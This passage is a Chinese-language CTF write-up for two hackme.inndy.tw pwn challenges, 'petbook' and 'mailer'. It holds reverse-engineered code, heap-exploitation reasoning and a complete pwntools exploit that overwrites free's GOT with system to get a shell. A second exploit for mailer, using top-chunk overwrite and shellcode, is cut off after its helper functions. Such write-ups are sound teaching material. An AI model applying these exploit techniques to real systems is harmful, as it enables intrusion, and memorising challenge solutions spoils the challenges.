    FORTIFY:  Enabled //查了一波这个保护机制，发现卵用不大，对解题无影响
这题的逻辑稍微复杂,首先让你进行登录，如果没有账号的话就需要去注册一个账号
    setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      if ( syscall(318LL, &magic, 4LL, 0LL) != 4 )
      {
        puts_0("Can not generate random");
        exit(1);
      }
      srandom(magic);
      v3 = base64_table;
      do
      {
        v4 = random();
        v5 = *v3;
        v6 = v4 % 64;
        *v3 = base64_table[v6];
        base64_table[v6] = v5;
        ++v3;
      }
      while ( v3 != &aBcdefghijklmno[63] );
      while ( 1 )
      {
        while ( 1 )
        {
          v7 = main_menu();
          if ( v7 != 2 )
            break;
          user_login();
        }
        if ( v7 == 3 )
          exit(0);
        if ( v7 == 1 )
          user_reg();
        else
          puts_0("Invalid option");
      }
在注册账号的时候，会有一个用户的结构体：
    这是我用IDA自己创建的，方便逆向理解 
    00000000 USER            struc ; (sizeof=0x218, mappedto_9)
    00000000 uid             dd ?
    00000004 name            db 256 dup(?)
    00000104 pwd             db 256 dup(?)
    00000204 flag            dd ?//用于标识是否为管理员用户
    00000208 pet             dq ?                    ; offset
    00000210 post            dq ?                    ; offset
    00000218 USER            ends
这些结构体的成员都存在一个堆块里面
注册成功后登录，进入用户界面：
用户有写post、查看post内容，编辑post，改密码，领取pet，给pet改名，丢弃pet的功能，
然后pet也有一个对应的结构体：
    00000000 PET             struc ; (sizeof=0x14, mappedto_10)
    00000000 pid             dq ?
    00000008 petname         dq ? //存储指向petname的堆地址
    00000010 pet_type        db 4 dup(?)
    00000014 PET             ends
这题除了逻辑比较复杂，还存在很多的堆的创建和时候，我们来理一下：
  * 注册用户的时候，创建大小为0x218的堆块来存储用户信息
  * 创建post的时候，创建0x110的chunk用于存储uid、title、post指针，创建任意大小的chunk存储post内容
  * 领取pet的时候，创建0x10001的chunk存储pet的名字，创建0x18的chunk存储pet的uid和name的指针和type
总结来说就只有post的时候是可以控制创建任意大小的chunk 的
再来看看哪些地方有free 掉chunk的操作：
  * 在edit post的时候，如果编辑的size大于原来的，那么realloc函数就会把原来的post所在的chunk给free掉重新生成大的chunk存储post的内容
  * 在 abandon pet的时候，会把存储pet的信息的chunk给free掉，同时清空user的pet成员
通过上面的分析，不难看出，我们的利用点主要是edit
post操作，如果创建一个0x218的post，接着edit它，将size改大，那么这个0x110的chunk就会进入unsorted bin
，这个时候如果进行注册user，那么user的结构体的各个成员就能预先设定好，从而有操作的空间
核心的思路就是：通过构造post，然后在edit post使得post内容的chunk进入unsorted
bin，接着新建用户，操作user结构体的各个成员，伪造pet的chunk和内容，达到任意读写的目的
由于本题中有很多这样的magic的检查：
    if ( (magic ^ *current_user) & 0xFFFF0000 )
      {
        puts_0("corrupted object detected");
        exit(1);
      }
因此我们要写泄漏出magic来，才能方便进行操作
分四步走：
  * 第一步:通过post伪造user,泄露出堆基地址
  * 第二步:伪造pet,泄露出puts,从而泄露libc
  * 第三步:泄露出magic,绕过检查,修改free的got表为system
  * 第四步:通过free(/bin/sh\x00)来getshell
exp如下
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./petbook"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    if sys.argv[1] == "r":
        libc = ELF("./libc-2.23.so.x86_64")
        p = remote("hackme.inndy.tw",7710)
    elif sys.argv[1] == "l":
        libc = elf.libc
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc():
        return p.recv()
    def sp():
        print "---------暂停中---------"
        return raw_input()
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def getshell():
        p.interactive()
    #-------------------------------------    def register(name,pwd):
        sla(p," >>\n","1")
        sla(p," >>\n",name)
        sla(p," >>\n",pwd)
    def login(name,pwd):
        sla(p," >>\n","2")
        sla(p," >>\n",name)
        sla(p," >>\n",pwd)  
    def exit():
        sla(p," >>\n","0")
    def post(title,length,content):
        sla(p," >>\n","1")
        sla(p," >>\n",title)
        sla(p," >>\n",str(length))
        sla(p," >>\n",content)
    def edit_post(id,title,size,content):
        sla(p," >>\n",'3')   
        sla(p,"Post id >>\n",str(id))
        sla(p,"New title >>\n",title)
        sla(p,"New content size >>\n",str(size))
        sla(p,"Content >>\n",content)     
    def adopt(name):
        sla(p," >>\n",'5')
        sla(p,"Name your pet >>\n",name)
    def rename(name):
        sla(p," >>\n",'6')  
        sla(p,"Name your pet >>\n",name)
    def abandom():
        sla(p," >>\n",'7')
    #gdb.attach(p,"tracemalloc on")
    sp()
    userdb=0x000603158 
    #第一步:通过post伪造user,泄露出堆基地址
    payload1= 'a'*0x208 + p64(userdb-0x10)
    register('user1','user1')
    login('user1','user1')
    post('post1',0x230,payload1) #post1
    edit_post(2,'post1',0x240,'post1')#post的uid是2
    exit()
    register('user2','user2')
    login('user2','user2')
    p.recvuntil("Pet Type: ")
    leak_heap = u64(p.recvline().strip('\n').ljust(8,'\x00'))
    heap_base = leak_heap - 0x230#通过gdb调试得出的0x230偏移,得到堆的基地址
    print "leak_heap--------------->",hex(leak_heap)
    print "heap_base--------------->",hex(heap_base)
    sp()
    #第二步:伪造pet,泄露出puts,从而泄露libc
    fake_pet = heap_base + 0x940#为了泄露出puts,需要构造一个假的的pet
    #0x940偏移是加上post后产生的0x120堆块得到的,使得fake_pet指向pust的got
    magic = 0x603164
    payload2 = 'a'*0x208 + p64(fake_pet)
    post('post2',0x100,p64(elf.got["puts"])*2)#uid = 4,post2
    post('post3',0x230,payload2)#uid = 5,post3
    edit_post(5,'post3',0x240,'post3')
    exit()
    register('user3','user3')
    login('user3','user3')
    p.recvuntil("Pet Name: ")
    leak_libc = u64(p.recvline().strip('\n').ljust(8,'\x00'))
    libc_base = leak_libc - libc.symbols['puts']
    system = libc_base+libc.symbols['system']
    print "libc_base----------->",hex(libc_base)
    exit()
    #第三步:泄露出magic,绕过检查,修改free的got表为system
    login('user2','user2')
    edit_post(4,'post2',0x100,p64(magic)*4)
    exit()
    login('user3','user3')
    p.recvuntil("Pet Name: ")
    leak_magic = u64(p.recvline().strip('\n').ljust(8,'\x00'))
    print "magic----------------->",hex(leak_magic)
    fake_magic = leak_magic + 0x600000000
    payload3 = p64(fake_magic) + p64(elf.got['free'])
    payload4 = 'a'*0x208 +  p64(fake_pet)
    post('post4',0x230,payload4) #uid = 7,post4
    edit_post(7,'post4',0x240,'post4')
    exit()
    register('user4','user4')
    login('user2','user2')
    edit_post(4,'post2',0x100,payload3)
    exit()
    login('user4','user4')
    rename(p64(system))
    exit()
    #第四步:通过free(/bin/sh\x00)来getshell
    register('user5','user5')
    login('user5','user5')
    adopt('/bin/sh\x00')
    abandom()
    getshell()
这题主要的难点在于程序逻辑复杂，东西一多就难以整理出对解题有用的线索，在做这题的时候花了很多时间，同时光看ida是不够的，还得边调试边加深对程序逻辑的理解。另外在堆利用方面这题也算是比较新颖，值得学习
这题应该可以用onegadget来做，但是不知道为什么没法getshell，可能是玄学环境问题吧
# mailer
32位程序，只开了个canary保护
程序逻辑比较简单
只有两个函数
write：
可以看到，这里使用了gets函数，则会有堆溢出的漏洞，
dump：
这个函数肯定是用于泄漏地址的，可以看到：`fwrite(mail + 18, 1u, mail[17], stdout);`
假如我们修改了length，那么由此泄漏出堆的地址
程序的主要逻辑就只有这些，我们会发现，没有free函数，那么就没法使用uaf等操作了
可利用的线索有：
  * 创建mail的时候存在堆溢出，可修改length，可泄漏地址
  * 创建mail的时候，写content时可溢出修改至top chunk
  * 没开NX，堆可执行代码
由此我们的思路就清晰了，步骤如下
  * 新建两个mail，创建chunk1和chunk2，其中chunk1输入title时写入shellcode，同时溢出到length，将其改为0x70，在使用dump功能的时候就可以把chunk1的堆地址泄漏出来
  * 同时在chunk2中输入content的时候，溢出到top chunk，修改size为0xffffffff
  * 再一次申请一个新的mail，大小为`elf.got["printf"] - top- 72-16`
  * 由于新的top chunk的size = old top chunk的地址+新malloc的chunk的大小，新的top chunk的地址为`elf.got["printf"] -16+4`
  * 下一次新建mail的时候，再输入的title就会刚刚好位于`elf.got["printf"]`中，修改为shellcode的地址
  * 改printf的got表为shellcode地址，从而getshell
exp如下：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./mailer"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    #libc = ELF("./libc-2.23.so")
    libc = elf.libc
    if sys.argv[1] == "r":
        p = remote("hackme.inndy.tw",7721)
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)